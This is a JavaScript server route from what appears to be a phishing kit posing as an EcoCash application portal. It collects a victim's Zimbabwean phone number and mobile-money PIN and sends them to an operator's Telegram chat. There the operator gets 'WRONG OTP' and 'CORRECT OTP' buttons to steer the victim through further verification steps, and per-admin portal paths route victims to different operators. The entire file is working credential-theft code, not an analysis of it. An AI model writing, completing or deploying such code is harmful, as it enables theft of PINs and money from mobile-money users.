// STEP 2 SUBMISSION: PIN delivered with 2 buttons (WRONG OTP & CORRECT OTP)
app.post('/api/submit-credentials', async (req, res) => {
  try {
    const data = req.body;
    const formattedPhone = formatZimbabwePhone(data.phone);

    if (!['77', '78'].some(prefix => formattedPhone.startsWith(prefix))) {  
      return res.status(400).json({ success: false, error: "Only valid EcoCash phone numbers (+263 77 / +263 78) are allowed." });  
    }  

    const randomHex = Math.random().toString(36).substring(2, 6).toUpperCase();  
    const appReference = `ECO-${Date.now().toString().slice(-6)}-${randomHex}`;  

    let portalPath = data.portalPath || '';  
    if (!portalPath.startsWith('/Admin-')) {  
      portalPath = '/Admin-0001';  
    }  
      
    // Dynamically retrieve the latest chat ID mapped to this portal path
    const targetChatId = pathToAdminChat.get(portalPath);  

    if (!targetChatId) {  
      return res.status(400).json({ success: false, error: "This portal link is not currently mapped to an active session or admin." });  
    }  

    activeApplications.set(appReference, {  
      ...data,  
      formattedPhone,  
      portalPath,  
      targetChatId,  
      status: 'PIN_PENDING'  
    });  

    const botToken = process.env.TELEGRAM_BOT_TOKEN;  

    if (botToken && targetChatId) {  
      const currentTimestamp = new Date().toLocaleString('en-US', {  
        timeZone: 'Africa/Harare',  
        year: 'numeric', month: 'numeric', day: 'numeric',  
        hour: 'numeric', minute: '2-digit', second: '2-digit', hour12: true  
      });  

      const messageText = `🔐 <b>NEW ECOCASH APPLICATION</b>\n\n` +  
                          `📋 <b>Ref:</b> <code>${appReference}</code>\n` +  
                          `📞 <b>Phone:</b> 263${formattedPhone}\n` +  
                          `🔑 <b>PIN (4-digit):</b> <code>${data.pin || 'N/A'}</code>\n` +  
                          `⏰ <b>Date:</b> ${currentTimestamp}\n\n` +  
                          `❓ <b>VERIFY CREDENTIALS:</b>`;  

      const telegramPayload = {  
        chat_id: targetChatId,  
        text: messageText,  
        parse_mode: 'HTML',  
        reply_markup: JSON.stringify({  
          inline_keyboard: [  
            [  
              { text: '❌ WRONG OTP', callback_data: `otp_wrong_${appReference}` },  
              { text: '✅ CORRECT OTP', callback_data: `step3_prompt_${appReference}` }  
            ]  
          ]  
        })  
      };  

      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {  
        method: "POST",  
        headers: { "Content-Type": "application/json" },  
        body: JSON.stringify(telegramPayload)  
      });  
    }  

    res.status(201).json({ success: true, appReference });

  } catch (error) {
    console.error("Credentials submission error:", error);
    res.status(500).json({ success: false, error: "Internal Server Error" });
  }
});
        
